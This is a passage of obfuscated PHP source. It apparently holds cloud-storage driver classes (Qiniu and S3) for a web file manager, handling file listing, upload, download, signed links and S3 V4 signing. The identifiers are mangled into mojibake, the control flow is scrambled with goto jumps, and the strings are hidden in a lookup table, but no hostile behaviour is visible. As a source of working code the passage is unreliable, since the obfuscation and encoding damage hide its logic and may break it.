} foreach ($f∂©–≥Ñ≥É[$fÕÎÕèªª[74]] as $CΩ‘•»©◊ç => $cÓãø€∂ÜÖ) { $f∂©–≥Ñ≥É[$fÕÎÕèªª[74]][$CΩ‘•»©◊ç] = $this->fileInfo($cÓãø€∂ÜÖ[$fÕÎÕèªª[93]], $fè∂ä˘·å∂, $cÓãø€∂ÜÖ); } return $f∂©–≥Ñ≥É; } public function has($c™™§¯Ÿª«, $EÖÊ “ÕÑÕ = false, $aÌ›´ÕŒ®ê = true) { goto cΩÍáåü˘î; CÒ¶≠ÀΩÓı: return !1; goto AèøêÂêÇ˘; cΩÍáåü˘î: $D±”º›çÛ» =& $_SERVER[Öíæ€“”≠éÏË]; $c™™§¯Ÿª« = trim($c™™§¯Ÿª«, $D±”º›çÛ»[8]); $Fó⁄è‡ø™¿ = empty($c™™§¯Ÿª«) && $c™™§¯Ÿª« !== $D±”º›çÛ»[191] ? $D±”º›çÛ»[33] : $c™™§¯Ÿª« . $D±”º›çÛ»[8]; goto dÉ≠ò£‘íø; dÉ≠ò£‘íø: $Bπæ´´‰ıö = $D±”º›çÛ»[33]; $DÚ‚ı˘·ÑÈ = 500; $B≤ËÑÓçèÏ = $D±”º›çÛ»[8]; goto a∫ã¡ÖÃï÷; a∫ã¡ÖÃï÷: $fùÈ∂õÏ» = $F¨π≤…Îåõ = 0; while (!0) { check_abort(); list($aùØ´ã£“ª, $dŒ˜⁄∑ﬂ†·) = $this->bucketManager->listFiles($this->bucket, $Fó⁄è‡ø™¿, $Bπæ´´‰ıö, $DÚ‚ı˘·ÑÈ, $B≤ËÑÓçèÏ); if ($dŒ˜⁄∑ﬂ†·) { break; } $Bπæ´´‰ıö = array_key_exists($D±”º›çÛ»[1285], $aùØ´ã£“ª) ? $Bπæ´´‰ıö = $aùØ´ã£“ª[$D±”º›çÛ»[1316]] : $D±”º›çÛ»[33]; if ($EÖÊ “ÕÑÕ) { if (!empty($aùØ´ã£“ª[$D±”º›çÛ»[1317]])) { $fùÈ∂õÏ» += count($aùØ´ã£“ª[$D±”º›çÛ»[1317]]); } if (!empty($aùØ´ã£“ª[$D±”º›çÛ»[1318]])) { $F¨π≤…Îåõ += count($aùØ´ã£“ª[$D±”º›çÛ»[1318]]); } if ($Bπæ´´‰ıö === $D±”º›çÛ»[33]) { break; } continue; } if ($aÌ›´ÕŒ®ê) { if (!empty($aùØ´ã£“ª[$D±”º›çÛ»[1317]])) { return !0; } } else { if (!empty($aùØ´ã£“ª[$D±”º›çÛ»[1318]])) { return !0; } } if ($Bπæ´´‰ıö === $D±”º›çÛ»[33]) { break; } } if ($EÖÊ “ÕÑÕ) { return array($D±”º›çÛ»[203] => $fùÈ∂õÏ», $D±”º›çÛ»[204] => $F¨π≤…Îåõ); } goto CÒ¶≠ÀΩÓı; AèøêÂêÇ˘: } public function listAll($BöÀ£±ƒ¿Ù) { $Eò≤¥…∑åä =& $_SERVER[Öíæ€“”≠éÏË]; $FØÊ“äâÛÓ = $this->fileList($BöÀ£±ƒ¿Ù, $Eò≤¥…∑åä[33], !0); $F∏Ì∂È©ÌÌ = array(); foreach ($FØÊ“äâÛÓ[$Eò≤¥…∑åä[74]] as $cÈπö†ÖõÇ) { $F∏Ì∂È©ÌÌ[$cÈπö†ÖõÇ[$Eò≤¥…∑åä[93]]] = $cÈπö†ÖõÇ[$Eò≤¥…∑åä[78]]; } foreach ($FØÊ“äâÛÓ[$Eò≤¥…∑åä[75]] as $cÈπö†ÖõÇ) { if (is_string($cÈπö†ÖõÇ)) { $F∏Ì∂È©ÌÌ[$cÈπö†ÖõÇ] = 0; } } return $this->listAllFiles($BöÀ£±ƒ¿Ù, array_keys($F∏Ì∂È©ÌÌ), $F∏Ì∂È©ÌÌ); } private function fileList($b¥î‹µ˜´√, $bÖÇ∏äæíπ = '', $A⁄Æä—à≥ = 0) { goto cà™Ô‡ù—–; cà™Ô‡ù—–: $Aùˆ∆›ü§¥ =& $_SERVER[Öíæ€“”≠éÏË]; $b¥î‹µ˜´√ = trim($b¥î‹µ˜´√, $Aùˆ∆›ü§¥[8]); $FëÔ®È∑¡– = empty($b¥î‹µ˜´√) && $b¥î‹µ˜´√ !== $Aùˆ∆›ü§¥[191] ? $Aùˆ∆›ü§¥[33] : $b¥î‹µ˜´√ . $Aùˆ∆›ü§¥[8]; goto F≈…ôÇˆ∂®; eùÃæ–Æ¿è: $EÆÓëÙõÇÕ = $Côã∆êøøÍ = array(); while (!0) { check_abort(); list($Bâµ†∞ì‘÷, $F§ú…÷ôºã) = $this->bucketManager->listFiles($this->bucket, $FëÔ®È∑¡–, $fÓœµ€Æ—®, $E¶Ÿñ‡ÆøÊ, $bÖÇ∏äæíπ); if ($F§ú…÷ôºã) { break; } $fÓœµ€Æ—® = array_key_exists($Aùˆ∆›ü§¥[1285], $Bâµ†∞ì‘÷) ? $fÓœµ€Æ—® = $Bâµ†∞ì‘÷[$Aùˆ∆›ü§¥[1316]] : $Aùˆ∆›ü§¥[33]; $BÛì·ô∆û = isset($Bâµ†∞ì‘÷[$Aùˆ∆›ü§¥[1317]]) ? $Bâµ†∞ì‘÷[$Aùˆ∆›ü§¥[1317]] : array(); $cÖ‰Ò∑ˆ§¯ = isset($Bâµ†∞ì‘÷[$Aùˆ∆›ü§¥[1318]]) ? $Bâµ†∞ì‘÷[$Aùˆ∆›ü§¥[1318]] : array(); foreach ($BÛì·ô∆û as $FËò∑‡èÁß) { goto Dé°¯áéÛÚ; aØ√—ãıàá: $FËò∑‡èÁß[$Aùˆ∆›ü§¥[78]] = $C£ä≈©¯ä¯; $FõÜèÌ“«Í = $C£ä≈©¯ä¯ == 0 && substr($Fˆøﬁûö’ﬁ, strlen($Fˆøﬁûö’ﬁ) - 1, 1) == $Aùˆ∆›ü§¥[8] ? !0 : !1; if ($Eå÷Ãﬁ∞Ωâ) { $this->cacheMethod($Aùˆ∆›ü§¥[199], $Fˆøﬁûö’ﬁ, $FõÜèÌ“«Í); $this->cacheMethod($Aùˆ∆›ü§¥[200], $Fˆøﬁûö’ﬁ, $FËò∑‡èÁß); } goto cÑÑ”Ω…µ‘; Dé°¯áéÛÚ: if ($FËò∑‡èÁß[$Aùˆ∆›ü§¥[93]] == $FëÔ®È∑¡–) { continue; } $Fˆøﬁûö’ﬁ = $FËò∑‡èÁß[$Aùˆ∆›ü§¥[93]]; $C£ä≈©¯ä¯ = $FËò∑‡èÁß[$Aùˆ∆›ü§¥[1314]]; goto aØ√—ãıàá; cÑÑ”Ω…µ‘: if ($FõÜèÌ“«Í) { $EÆÓëÙõÇÕ[] = $Fˆøﬁûö’ﬁ; continue; } $Côã∆êøøÍ[] = $A⁄Æä—à≥ ? $FËò∑‡èÁß : $Fˆøﬁûö’ﬁ; goto AÀåÔûÿƒÕ; AÀåÔûÿƒÕ: } foreach ($cÖ‰Ò∑ˆ§¯ as $Fˆøﬁûö’ﬁ) { if ($Fˆøﬁûö’ﬁ == $FëÔ®È∑¡–) { continue; } $EÆÓëÙõÇÕ[] = $Fˆøﬁûö’ﬁ; if ($Eå÷Ãﬁ∞Ωâ) { $this->cacheMethod($Aùˆ∆›ü§¥[199], $Fˆøﬁûö’ﬁ, !0); } } if ($fÓœµ€Æ—® === $Aùˆ∆›ü§¥[33]) { break; } } if ($Eå÷Ãﬁ∞Ωâ) { $this->cacheMethod($Aùˆ∆›ü§¥[199], $b¥î‹µ˜´√, !0); } goto Cä≈©àÃáÏ; F≈…ôÇˆ∂®: $fÓœµ€Æ—® = $Aùˆ∆›ü§¥[33]; $E¶Ÿñ‡ÆøÊ = 1000; $Eå÷Ãﬁ∞Ωâ = $this->listItemCache === !1 ? !1 : !0; goto eùÃæ–Æ¿è; Cä≈©àÃáÏ: return array($Aùˆ∆›ü§¥[75] => $EÆÓëÙõÇÕ, $Aùˆ∆›ü§¥[74] => $Côã∆êøøÍ); goto e÷ïœÇæïç; e÷ïœÇæïç: } public function canRead($CÒ´ìµÂ‡û) { return $this->exist($CÒ´ìµÂ‡û) ? !0 : !1; } public function canWrite($Eô“°ÑÈ¯ÿ) { return $this->exist($Eô“°ÑÈ¯ÿ) ? !0 : !1; } public function getContent($D€Öäøõìã) { return $this->fileSubstr($D€Öäøõìã, 0, -1); } public function setContent($FåÑí£≈î§, $Dé§øâÒ◊„ = '') { $bÀ¯©í©ﬂ∞ = $this->tempFile($this->pathThis($FåÑí£≈î§)); file_put_contents($bÀ¯©í©ﬂ∞, $Dé§øâÒ◊„); if ($this->upload($FåÑí£≈î§, $bÀ¯©í©ﬂ∞)) { $this->tempFileRemve($bÀ¯©í©ﬂ∞); return !0; } return !1; } public function refreshUrls($F∏…ù¬Ï©‡) { goto cˆ¿ë°“†ø; Aπ®ê«Ìâ: return $fàÂïÔëÑâ[$C…ﬁ≥©Êé«[1087]] == $C…ﬁ≥©Êé«[733] ? !0 : !1; goto AŒ ≥å—‰‚; cπ∆ÂŸÒ‚õ: $eèâ—ìö˘˘ = new Qiniu\Cdn\CdnManager($this->auth); list($fàÂïÔëÑâ, $bµÕù‡ıŸÙ) = $eèâ—ìö˘˘->refreshUrls($Dƒ”íÚ≈Õ˜); if ($bµÕù‡ıŸÙ) { return !1; } goto Aπ®ê«Ìâ; cˆ¿ë°“†ø: $C…ﬁ≥©Êé« =& $_SERVER[Öíæ€“”≠éÏË]; $Dƒ”íÚ≈Õ˜ = array(); if (is_array($F∏…ù¬Ï©‡)) { foreach ($F∏…ù¬Ï©‡ as $F†ßßﬂüë€) { $Dƒ”íÚ≈Õ˜[] = $this->link($F†ßßﬂüë€); } } else { $Dƒ”íÚ≈Õ˜[] = $this->link($F∏…ù¬Ï©‡); } goto cπ∆ÂŸÒ‚õ; AŒ ≥å—‰‚: } public function fileSubstr($Dƒ±ÈÉ¶Ó›, $F·ÉÑ¥ãÀ÷, $e◊≈Òôª Ê) { $EäøÀê“≥â =& $_SERVER[Öíæ€“”≠éÏË]; if (!($añÒî∂œ¨º = $this->link($Dƒ±ÈÉ¶Ó›))) { return !1; } $Cò˜—…≈óå = !1; if ($e◊≈Òôª Ê > 0) { $cıπ´Êê®Ø = $F·ÉÑ¥ãÀ÷ + $e◊≈Òôª Ê - 1; $Cò˜—…≈óå = array($EäøÀê“≥â[1319] . $F·ÉÑ¥ãÀ÷ . $EäøÀê“≥â[441] . $cıπ´Êê®Ø); } $bç∏Ã¯Õ…ï = url_request($añÒî∂œ¨º, $EäøÀê“≥â[228], !1, $Cò˜—…≈óå); return $bç∏Ã¯Õ…ï[$EäøÀê“≥â[723]] ? $bç∏Ã¯Õ…ï[$EäøÀê“≥â[1097]] : !1; } public function upload($B‚åﬁª ”µ, $A∑æ√øµƒØ, $e‘‘˜Èèÿ∞ = false, $eœÁº‰∏ﬁ = REPEAT_REPLACE) { $dÁëÀµÉˆ® = new Qiniu\Storage\UploadManager(); $E£ûÚåÚ ö = $this->auth->uploadToken($this->bucket, $B‚åﬁª ”µ); $B∞‘±éﬁ‘∏ = get_file_mime(get_path_ext($A∑æ√øµƒØ)); list($b™∞îŸÃÚ¬, $e±œ¥ÚÜΩù) = $dÁëÀµÉˆ®->putFile($E£ûÚåÚ ö, $B‚åﬁª ”µ, $A∑æ√øµƒØ, null, $B∞‘±éﬁ‘∏); return $e±œ¥ÚÜΩù ? !1 : $this->getPathOuter($B‚åﬁª ”µ); } public function uploadFormData($BΩïä©‘®√, $A”ëÉ–∑ü€ = 3600) { return $this->uploadToken($BΩïä©‘®√, $A”ëÉ–∑ü€); } public function multiUploadFormData($f≤Ùà°…ï≈, $fêã£Ì…ªî = 3600) { return $this->uploadToken($f≤Ùà°…ï≈, $fêã£Ì…ªî); } private function uploadToken($bç’ÔòÉãß, $e¨ÉƒàóêÌ = 3600) { goto e≠äÇë€∆‘; CûÆô„å≈„: $CÁ‘»—ﬁ—É = http_type() . "\x3a\x2f\x2f\165\160\x6c\x6f\141\144{$fêúÊûÑ™∏}\56\161\151\156\151\165\x70\56\x63\x6f\155\x2f"; return array($FöÒù£©Øç[1323] => $dÉíéÛﬂëŸ, $FöÒù£©Øç[1324] => $CÁ‘»—ﬁ—É); goto d˘éáπéÕÑ; e≠äÇë€∆‘: $FöÒù£©Øç =& $_SERVER[Öíæ€“”≠éÏË]; $d∂›áûèå = $e¨ÉƒàóêÌ; $Fì®⁄ﬂå§› = array($FöÒù£©Øç[1320] => $FöÒù£©Øç[1321]); goto fÃ∆√ê¿∞; fÃ∆√ê¿∞: $F–⁄•‹ë∂Ó = $bç’ÔòÉãß; $dÉíéÛﬂëŸ = $this->auth->uploadToken($this->bucket, $F–⁄•‹ë∂Ó, $d∂›áûèå, $Fì®⁄ﬂå§›, !0); $fêúÊûÑ™∏ = empty($this->region) || $this->region == $FöÒù£©Øç[1322] ? $FöÒù£©Øç[33] : $FöÒù£©Øç[441] . $this->region; goto CûÆô„å≈„; d˘éáπéÕÑ: } public function download($f∆¶°⁄Õ™Ÿ, $Dû ä≠ÓÁÇ) { goto Dá‰›¡çÖ¢; Dá‰›¡çÖ¢: $dÍ∏Ã´âüö = IO::getPathInner(IO::mkfile($Dû ä≠ÓÁÇ)); if (!($dÑáıáúãÏ = $this->link($f∆¶°⁄Õ™Ÿ))) { return !1; } $cƒÊÓ©∆Á« = 0; goto eàΩØ≥Â±ß; c“Ùú©ì∞Æ: fclose($dé°à±∆¥¿); return $Dû ä≠ÓÁÇ; goto büÇıöπå˜; eàΩØ≥Â±ß: $F∑ùÍ±œÉÌ = 1024 * 200; $dé°à±∆¥¿ = fopen($dÍ∏Ã´âüö, $_SERVER[Öíæ€“”≠éÏË][1325]); while (!0) { $A„ﬁ€∑Ú∂ç = $this->fileSubstr($f∆¶°⁄Õ™Ÿ, $cƒÊÓ©∆Á«, $F∑ùÍ±œÉÌ); if ($A„ﬁ€∑Ú∂ç === !1) { return !1; } fwrite($dé°à±∆¥¿, $A„ﬁ€∑Ú∂ç); $cƒÊÓ©∆Á« += $F∑ùÍ±œÉÌ; if (strlen($A„ﬁ€∑Ú∂ç) < $F∑ùÍ±œÉÌ) { break; } } goto c“Ùú©ì∞Æ; büÇıöπå˜: } public function link($f©∫Öá’âÃ, $bãŒﬁ∞ã¢„ = '') { if (!$this->isFile($f©∫Öá’âÃ)) { return !1; } $B™¡ÇÉ≈¨¨ = $this->getHost() . $_SERVER[Öíæ€“”≠éÏË][8] . $this->pathEncode($f©∫Öá’âÃ) . $bãŒﬁ∞ã¢„; return $this->auth->privateDownloadUrl($B™¡ÇÉ≈¨¨, 3600 * 12); } public function fileOut($d√õêΩÉÒ∂, $Aπ∞’Ë°‘¨ = false, $c—ôáı≠Õ™ = false, $a–≤íÔÖÆÖ = '') { $AÃ¡·µ•‘â =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->isFileOutServer()) { return $this->fileOutServer($d√õêΩÉÒ∂, $Aπ∞’Ë°‘¨, $c—ôáı≠Õ™, $a–≤íÔÖÆÖ); } if (!$c—ôáı≠Õ™) { $c—ôáı≠Õ™ = $this->pathThis($d√õêΩÉÒ∂); } $eÃÆÎÚ’›° = $Aπ∞’Ë°‘¨ ? $AÃ¡·µ•‘â[1326] . rawurlencode($c—ôáı≠Õ™) : $AÃ¡·µ•‘â[33]; $båﬁÍï™‚≤ = $this->link($d√õêΩÉÒ∂, $eÃÆÎÚ’›°); $this->fileOutLink($båﬁÍï™‚≤); } public function fileOutServer($EÇ≠á˜ôı¨, $C∆πöô†»‚ = false, $aááÍ†ÒÉé = false, $AÍçÍÖø®ﬂ = '') { parent::fileOut($EÇ≠á˜ôı¨, $C∆πöô†»‚, $aááÍ†ÒÉé, $AÍçÍÖø®ﬂ); } public function fileOutImage($d‚∑ö¥Ü£©, $F™∫∫ƒàÈ≤ = 250) { $CÚ…èÖÂù≤ = $this->link($d‚∑ö¥Ü£©, $_SERVER[Öíæ€“”≠éÏË][1327] . $F™∫∫ƒàÈ≤); $this->fileOutLink($CÚ…èÖÂù≤); } public function fileOutImageServer($eçÇ·Íı∂, $fÁœÂÖÙ≠° = 250) { parent::fileOutImage($eçÇ·Íı∂, $fÁœÂÖÙ≠°); } public function hashMd5($CìÿÙÍÉíê) { $E∫”Ô¢–ﬂé =& $_SERVER[Öíæ€“”≠éÏË]; $b¿©≥†Ò≠∞ = $this->objectMeta($CìÿÙÍÉíê); return isset($b¿©≥†Ò≠∞[$E∫”Ô¢–ﬂé[208]]) ? $b¿©≥†Ò≠∞[$E∫”Ô¢–ﬂé[208]] : !1; $AÑ†úÁŸ∑‹ = $this->link($CìÿÙÍÉíê, $E∫”Ô¢–ﬂé[1328]); } public function size($A◊öûà‡÷é) { $dÚöπº‘Ì® = $this->objectMeta($A◊öûà‡÷é); return $dÚöπº‘Ì® ? $dÚöπº‘Ì®[$_SERVER[Öíæ€“”≠éÏË][78]] : 0; } public function info($d¨£Ú¯ßø”) { if ($this->isFolder($d¨£Ú¯ßø”)) { return $this->folderInfo($d¨£Ú¯ßø”); } else { if ($this->isFile($d¨£Ú¯ßø”)) { return $this->fileInfo($d¨£Ú¯ßø”); } } return !1; } public function exist($AÒÑëºîö◊) { return $this->isFile($AÒÑëºîö◊) || $this->isFolder($AÒÑëºîö◊); } public function isFile($f¡æÏáª¯Ó) { return !$this->isFolder($f¡æÏáª¯Ó) && $this->objectMeta($f¡æÏáª¯Ó); } public function isFolder($aπ√îÓÆË®) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][199], $aπ√îÓÆË®); } protected function objectMeta($bµ‚«˘ƒÆâ) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][200], $bµ‚«˘ƒÆâ); } protected function _objectMeta($cñ¢ª¿¯∫®) { $eÂ‰∏âÜìø =& $_SERVER[Öíæ€“”≠éÏË]; list($eÈÊåÈ◊í’, $EŸÿﬁøù¡Ú) = $this->bucketManager->stat($this->bucket, $cñ¢ª¿¯∫®); if ($eÈÊåÈ◊í’) { $eÈÊåÈ◊í’[$eÂ‰∏âÜìø[78]] = intval($eÈÊåÈ◊í’[$eÂ‰∏âÜìø[1314]]); } return $eÈÊåÈ◊í’; } protected function _isFolder($D±Ù„Ç¨∏Ü) { $còÒ›“ò£Ã =& $_SERVER[Öíæ€“”≠éÏË]; if ($D±Ù„Ç¨∏Ü == $còÒ›“ò£Ã[33] || $D±Ù„Ç¨∏Ü == $còÒ›“ò£Ã[8]) { return !0; } list($f˘≈ôﬂºÒó, $C‹«Òß∑ñ‹) = $this->bucketManager->listFiles($this->bucket, trim($D±Ù„Ç¨∏Ü, $còÒ›“ò£Ã[8]) . $còÒ›“ò£Ã[8], $còÒ›“ò£Ã[33], 1, $còÒ›“ò£Ã[8]); return !empty($f˘≈ôﬂºÒó[$còÒ›“ò£Ã[1317]]) || !empty($f˘≈ôﬂºÒó[$còÒ›“ò£Ã[1318]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($e¨‰≈®€∞˜) { parent::__construct($e¨‰≈®€∞˜); } public function uploadFormData($fî∞˜·»É•, $cÖàÆµë›â = 3600) { goto A™≈≥‰ΩÛ√; E®—¢®…¡∞: $Bß ôÒı‡≠ = base64_encode(json_encode($fê¥œﬂ∆“’)); $bÏŒÍãíèÏ = hash_hmac($B¬ôŸô≥ÖÏ[1245], $CÏœ›˘Óî‡, $B¬ôŸô≥ÖÏ[1246] . $this->secret, !0); $D÷ç–êÇå = hash_hmac($B¬ôŸô≥ÖÏ[1245], $this->region, $bÏŒÍãíèÏ, !0); goto câ≠Ñ›™Üÿ; bÉæı…àî¬: $CãÒÊ°ÇΩ¡ = $B¬ôŸô≥ÖÏ[59]; $eÑë¡§Ø◊≠ = gmdate($B¬ôŸô≥ÖÏ[1236]); $CÏœ›˘Óî‡ = gmdate($B¬ôŸô≥ÖÏ[724]); goto c¢êÁà¡Ù∑; câ≠Ñ›™Üÿ: $a‰Îôô£ñÌ = hash_hmac($B¬ôŸô≥ÖÏ[1245], $CãÒÊ°ÇΩ¡, $D÷ç–êÇå, !0); $DßúŸﬂ˜–¥ = hash_hmac($B¬ôŸô≥ÖÏ[1245], $AŒë©–ºø¬, $a‰Îôô£ñÌ, !0); $FÚπ€Ü“âΩ = hash_hmac($B¬ôŸô≥ÖÏ[1245], $Bß ôÒı‡≠, $DßúŸﬂ˜–¥); goto a∆Œ…ÿÃÃ; c¢êÁà¡Ù∑: $AŒë©–ºø¬ = $B¬ôŸô≥ÖÏ[1237]; $aÀ∞ˆ ˘√§ = $cÖàÆµë›â . $B¬ôŸô≥ÖÏ[33]; $Aê¯Ü¢È› = $B¬ôŸô≥ÖÏ[1198]; goto Aú∆‘ª™Ã∫; A™≈≥‰ΩÛ√: $B¬ôŸô≥ÖÏ =& $_SERVER[Öíæ€“”≠éÏË]; $a◊á·º üÿ = $B¬ôŸô≥ÖÏ[192]; $d…≠‰ó”›⁄ = $B¬ôŸô≥ÖÏ[1235]; goto bÉæı…àî¬; Aú∆‘ª™Ã∫: $c‡çñ°§ä· = array($this->accessKey, $CÏœ›˘Óî‡, $this->region, $CãÒÊ°ÇΩ¡, $AŒë©–ºø¬); $EÎåùà¯Áû = implode($B¬ôŸô≥ÖÏ[8], $c‡çñ°§ä·); $fê¥œﬂ∆“’ = array($B¬ôŸô≥ÖÏ[1200] => gmdate($B¬ôŸô≥ÖÏ[1199], strtotime($B¬ôŸô≥ÖÏ[1238])), $B¬ôŸô≥ÖÏ[1201] => array(array($B¬ôŸô≥ÖÏ[1203] => $this->bucket), array($B¬ôŸô≥ÖÏ[1202] => $a◊á·º üÿ), array($B¬ôŸô≥ÖÏ[1204], $B¬ôŸô≥ÖÏ[1205], $B¬ôŸô≥ÖÏ[33]), array($B¬ôŸô≥ÖÏ[1204], $B¬ôŸô≥ÖÏ[1239], $B¬ôŸô≥ÖÏ[33]), array($B¬ôŸô≥ÖÏ[1204], $B¬ôŸô≥ÖÏ[1240], $B¬ôŸô≥ÖÏ[33]), array($B¬ôŸô≥ÖÏ[1206] => $Aê¯Ü¢È›), array($B¬ôŸô≥ÖÏ[1241] => $EÎåùà¯Áû), array($B¬ôŸô≥ÖÏ[1242] => $d…≠‰ó”›⁄), array($B¬ôŸô≥ÖÏ[1243] => $eÑë¡§Ø◊≠), array($B¬ôŸô≥ÖÏ[1244] => $aÀ∞ˆ ˘√§))); goto E®—¢®…¡∞; a∆Œ…ÿÃÃ: $EäÜ‚êŸˆ˜ = array($B¬ôŸô≥ÖÏ[211] => $B¬ôŸô≥ÖÏ[33], $B¬ôŸô≥ÖÏ[1247] => $B¬ôŸô≥ÖÏ[33], $B¬ôŸô≥ÖÏ[1202] => $a◊á·º üÿ, $B¬ôŸô≥ÖÏ[1206] => $Aê¯Ü¢È›, $B¬ôŸô≥ÖÏ[1210] => $Bß ôÒı‡≠, $B¬ôŸô≥ÖÏ[1248] => $EÎåùà¯Áû, $B¬ôŸô≥ÖÏ[1249] => $d…≠‰ó”›⁄, $B¬ôŸô≥ÖÏ[1250] => $eÑë¡§Ø◊≠, $B¬ôŸô≥ÖÏ[1251] => $aÀ∞ˆ ˘√§, $B¬ôŸô≥ÖÏ[1252] => $FÚπ€Ü“âΩ, $B¬ôŸô≥ÖÏ[175] => $this->getHost()); return $EäÜ‚êŸˆ˜; goto a˘üûç©«Æ; a˘üûç©«Æ: } public function multiUploadFormData($Dç¶Ê§·«Î, $C˘üùÖÆÑ∏ = 3600) { $B“ı∑Ùì÷â =& $_SERVER[Öíæ€“”≠éÏË]; $CÛŒ˘›ﬁ–› = gmdate($B“ı∑Ùì÷â[1329]); $e∑•æ≥Á‘» = array(); $cÓ¨ÑÖ‰äÓ = $this->client->getUploadId($this->bucket, $Dç¶Ê§·«Î, $e∑•æ≥Á‘»); if (!$cÓ¨ÑÖ‰äÓ) { return !1; } return array($B“ı∑Ùì÷â[221] => $cÓ¨ÑÖ‰äÓ, $B“ı∑Ùì÷â[175] => $this->getHost() . $B“ı∑Ùì÷â[8] . $this->pathEncode($Dç¶Ê§·«Î), $B“ı∑Ùì÷â[222] => $CÛŒ˘›ﬁ–›, $B“ı∑Ùì÷â[93] => $Dç¶Ê§·«Î); } public function multiUploadAuthData($CÉ⁄•†¥Öú, $f£ü∂≈Ÿ√‰ = array()) { goto eÔ∑ïàÉÃú; FÙä´•ù∫º: $FØåàÈÿÏ∫ = $dÒ–¯µÇü†[226]; $fú‡à‘‚∏º = $dÒ–¯µÇü†[8] . $this->pathEncode($d©û÷±éÍ ) . $bÖ¶†·ƒ‰È; $d™›óÙÇÆ‹ = $this->client->__getSignatureV4($d…‚º›‡˜Œ, $C…“¨Õ‰†·, $FØåàÈÿÏ∫, $fú‡à‘‚∏º); goto EÍ¯ëÚƒóå; eÔ∑ïàÉÃú: $dÒ–¯µÇü† =& $_SERVER[Öíæ€“”≠éÏË]; $bÖ¶†·ƒ‰È = isset($f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[168]]) ? $f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[168]] : $dÒ–¯µÇü†[33]; $d©û÷±éÍ  = $f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[93]]; goto C÷‹∫Áëü√; e‹“öãÀ∑¬: if (isset($f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[1330]])) { $d…‚º›‡˜Œ[$dÒ–¯µÇü†[1331]] = $f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[1330]]; } $b·åüìÑé… = explode($dÒ–¯µÇü†[177], $this->getHost()); $C…“¨Õ‰†· = array($dÒ–¯µÇü†[1332] => $b·åüìÑé…[1], $dÒ–¯µÇü†[1333] => $dÒ–¯µÇü†[33], $dÒ–¯µÇü†[211] => $dÒ–¯µÇü†[119], $dÒ–¯µÇü†[1247] => $f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[78]]); goto FÙä´•ù∫º; C÷‹∫Áëü√: unset($f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[93]]); if (isset($f£ü∂≈Ÿ√‰[$dÒ–¯µÇü†[223]])) { return $this->listUploadParts($d©û÷±éÍ , $f£ü∂≈Ÿ√‰); } $d…‚º›‡˜Œ = array(); goto e‹“öãÀ∑¬; EÍ¯ëÚƒóå: if (strpos($bÖ¶†·ƒ‰È, $dÒ–¯µÇü†[225]) === 0) { if (isset($d…‚º›‡˜Œ[$dÒ–¯µÇü†[1331]])) { $aä¶ÒΩèêÀ = $d…‚º›‡˜Œ[$dÒ–¯µÇü†[1331]]; } else { if (isset($d™›óÙÇÆ‹[$dÒ–¯µÇü†[1331]])) { $aä¶ÒΩèêÀ = $d™›óÙÇÆ‹[$dÒ–¯µÇü†[1331]]; } else { $aä¶ÒΩèêÀ = hash($dÒ–¯µÇü†[1245], $dÒ–¯µÇü†[33]); } } return array($dÒ–¯µÇü†[232] => $d™›óÙÇÆ‹[$dÒ–¯µÇü†[232]], $dÒ–¯µÇü†[1331] => $aä¶ÒΩèêÀ, $dÒ–¯µÇü†[222] => $d™›óÙÇÆ‹[$dÒ–¯µÇü†[1334]]); } return $d™›óÙÇÆ‹[$dÒ–¯µÇü†[232]]; goto c´£ñ‚Èë¥; c´£ñ‚Èë¥: } public function listUploadParts($c‹°™œÜâ„, $B‡ªÉ≤˘Î = array()) { goto eç›∞Ÿﬂ¿§; Fı°–œ«ª‚: $Aı√‚‹á∂Á = $this->client->__getSignatureV4($eÇ∂ïÎŸÍº, $B–ü¨ø¨∑È, $aÜÂ†πû†∆, $e¨ÜÇ∫Í‹’, $fÀ˘∞ÇøÑä); return array($f«éÈ¬ıÁß[232] => $Aı√‚‹á∂Á[$f«éÈ¬ıÁß[232]], $f«éÈ¬ıÁß[222] => $Aı√‚‹á∂Á[$f«éÈ¬ıÁß[1334]], $f«éÈ¬ıÁß[234] => $F¨∆‘˜à©¢, $f«éÈ¬ıÁß[1331] => $Aı√‚‹á∂Á[$f«éÈ¬ıÁß[1331]]); goto côÖÔ„‚ıó; eç›∞Ÿﬂ¿§: $f«éÈ¬ıÁß =& $_SERVER[Öíæ€“”≠éÏË]; $dø¢∞§àâÙ = str_replace($f«éÈ¬ıÁß[233], $f«éÈ¬ıÁß[33], $B‡ªÉ≤˘Î[$f«éÈ¬ıÁß[168]]); $F¨∆‘˜à©¢ = $this->client->listParts($this->bucket, $c‹°™œÜâ„, $dø¢∞§àâÙ); goto a‹ï‡ôµ≤‹; a‹ï‡ôµ≤‹: if (!$F¨∆‘˜à©¢) { return !1; } $fÀ˘∞ÇøÑä = $f«éÈ¬ıÁß[1335]; foreach ($F¨∆‘˜à©¢ as $E¶ÍÒÜπ⁄Ü) { $fÀ˘∞ÇøÑä .= $f«éÈ¬ıÁß[1336] . "\74\x50\x61\162\164\116\x75\x6d\142\145\x72\x3e{$E¶ÍÒÜπ⁄Ü[$f«éÈ¬ıÁß[1292]]}\74\x2f\120\141\162\164\116\165\x6d\x62\145\162\76\12" . "\x3c\x45\x54\x61\147\76{$E¶ÍÒÜπ⁄Ü[$f«éÈ¬ıÁß[1293]]}\74\57\105\124\x61\147\76\12" . $f«éÈ¬ıÁß[1337]; } goto B®∫ûÔÆ∑Ø; B®∫ûÔÆ∑Ø: $fÀ˘∞ÇøÑä .= $f«éÈ¬ıÁß[1338]; $eÇ∂ïÎŸÍº = array(); $Eå«•∂–ﬁÀ = explode($f«éÈ¬ıÁß[177], $this->getHost()); goto eÖÁäõÊ≠…; eÖÁäõÊ≠…: $B–ü¨ø¨∑È = array($f«éÈ¬ıÁß[1332] => $Eå«•∂–ﬁÀ[1], $f«éÈ¬ıÁß[211] => $f«éÈ¬ıÁß[119], $f«éÈ¬ıÁß[1247] => strlen($fÀ˘∞ÇøÑä)); $aÜÂ†πû†∆ = $f«éÈ¬ıÁß[224]; 